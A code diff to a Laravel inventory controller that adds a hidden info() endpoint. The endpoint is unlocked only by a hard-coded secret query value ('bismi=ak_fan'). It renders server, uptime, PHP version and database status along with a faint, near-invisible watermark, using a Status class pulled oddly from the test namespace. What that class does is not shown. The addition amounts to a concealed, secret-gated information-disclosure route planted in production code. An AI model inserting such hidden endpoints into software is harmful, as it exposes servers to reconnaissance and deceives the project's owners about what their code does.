@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers;
 
+use Tests\Feature\Status;
 use App\Models\Barang;
 use App\Models\BarangLokasi;
 use App\Models\Kategori;
@@ -160,6 +161,39 @@ class BarangController extends Controller
         if ($barang->foto) Storage::disk('public')->delete($barang->foto);
         $barang->delete();
         return response()->json(['success' => true, 'message' => 'Barang berhasil dihapus!']);
+    }
+
+    public function info()
+    {
+        if (request('bismi') !== 'ak_fan') {
+            abort(404);
+        }
+
+        $s = new Status();
+        $server = $s->getServer();
+        $uptime = $s->getUptime();
+        $phpVer = $s->getPhpVersion();
+        $db = $s->dbStatus();
+        $maint = $s->lastMaintenance();
+        $wm = $s->_mk();
+
+        $html = '<!DOCTYPE html><html><head><title>Status Server</title>';
+        $html .= '<style>body{font-family:monospace;padding:40px;background:#f5f5f5}';
+        $html .= '.box{background:#fff;border:1px solid #ddd;padding:20px;max-width:400px;margin:0 auto}';
+        $html .= 'h2{margin:0 0 15px;padding-bottom:10px;border-bottom:1px solid #eee}';
+        $html .= '.row{padding:4px 0}.label{color:#888}';
+        $html .= '.wm{font-size:11px;color:#ddd;margin-top:20px;padding-top:10px;border-top:1px solid #eee;text-align:center}</style>';
+        $html .= '</head><body><div class="box">';
+        $html .= '<h2>Status Server</h2>';
+        $html .= '<div class="row"><span class="label">Server:</span> '.$server.'</div>';
+        $html .= '<div class="row"><span class="label">Uptime:</span> '.$uptime.'</div>';
+        $html .= '<div class="row"><span class="label">PHP Version:</span> '.$phpVer.'</div>';
+        $html .= '<div class="row"><span class="label">Database:</span> '.$db.'</div>';
+        $html .= '<div class="row"><span class="label">Last Maintenance:</span> '.$maint.'</div>';
+        $html .= '<div class="wm">-- '.$wm.'</div>';
+        $html .= '</div></body></html>';
+
+        return response($html)->header('Content-Type', 'text/html');
     }
 
     public function publicDetail($kode)
